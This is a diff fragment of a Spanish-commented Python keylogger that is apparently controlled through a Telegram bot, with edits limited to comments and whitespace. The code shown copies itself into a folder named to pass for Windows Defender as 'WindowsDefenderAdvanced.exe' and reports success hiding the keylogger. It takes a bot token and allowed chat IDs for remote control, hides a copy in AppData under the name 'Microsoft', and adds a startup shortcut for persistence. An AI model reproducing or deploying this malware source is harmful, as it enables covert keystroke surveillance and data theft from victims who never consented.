@@ -42,8 +42,6 @@ try: # Crea dirección
     os.makedirs('C:\\Users\\Public\\Security\\Windows Defender')
 except:
     pass
-
-
 nameKey = "WindowsDefenderAdvanced.exe"
 filePath = "C:\\Users\\Public\\Security\\Windows Defender\\"+ nameKey
 try:
@@ -56,9 +54,6 @@ except :
         print("El keylogger se escondió exitosamente en el sistema")
     except:
         print("No se puedo esconder el Keylogger en el sistema")
-
-
-
 try:  # Intenta crear la dirección
     os.makedirs('logs')
 except:
@@ -67,17 +62,15 @@ except:
 cd.log('i','Starting')
 me = singleton.SingleInstance()
 
-token = 'xx:xx'       # REPLACE THE LINE BELOW WITH THE TOKEN OF THE BOT YOU GENERATED!
+token = 'xx:xx'                                                 # <== Aquí debes ingresar el codigo único de tu Bot
 if 'RVT_TOKEN' in os.environ:                                   # it can also be set as an environment variable
     token = os.environ['RVT_TOKEN']
     
 app_name = 'Microsoft'                                          # Nombre de la carpeta en dentro delRoaming
-known_ids = ['']                      # Ejemplo => 991466973 <= Ejemplo                 # AGREGUE SU chat_id EN FORMATO DE CADENA A LA LISTA A CONTINUACIÓN SI DESEA QUE SU BOTELO SOLO RESPONDA A UNA PERSONA
+known_ids = ['']                                                # Ejemplo => 991466973 <= Ejemplo                 # AGREGUE SU chat_id EN FORMATO DE CADENA A LA LISTA A CONTINUACIÓN SI DESEA QUE SU BOTELO SOLO RESPONDA A UNA PERSONA
 appdata_roaming_folder = os.environ['APPDATA']
 hide_folder = appdata_roaming_folder + '\\' + app_name      #Carpeta escondite
-# Name of compiled .exe to hide in hide_folder, i.e 'C:\Users\Username\AppData\Roaming\Portal\portal.exe'
 compiled_name = app_name + '.exe'           # ruta donde se compilará
-# ---------------------------------------------
 target_shortcut = startup() + '\\' + compiled_name.replace('.exe', '.lnk')
 if not os.path.exists(hide_folder):
 	os.makedirs(hide_folder)
